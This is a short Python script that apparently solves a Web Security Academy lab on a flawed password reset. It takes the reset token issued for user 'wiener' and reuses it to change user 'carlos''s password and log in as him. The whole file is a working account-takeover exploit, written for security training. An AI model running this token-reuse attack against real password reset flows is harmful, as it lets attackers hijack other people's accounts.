from web_security_academy.core.email_client import EmailClient
from web_security_academy.core.logger import logger

import re


def solve_lab(session):
    session.post_path("/forgot-password", data={"username": "wiener"})
    logger.info('Generated temporary forgot password token for user "wiener"')

    email_client = EmailClient(session)
    token = re.search(
        r"temp-forgot-password-token=([a-z0-9]+)", str(email_client.emails[-1]["Body"])
    ).group(1)
    logger.info(f"Extracted token from email: {token}")

    data = {
        "temp-forgot-password-token": token,
        "username": "carlos",
        "new-password-1": "123456",
        "new-password-2": "123456",
    }
    session.post_path(f"/forgot-password?temp-forgot-password-token={token}", data=data)
    logger.info("Used token to change carlos's password")
    session.login("carlos", "123456", with_csrf=False)
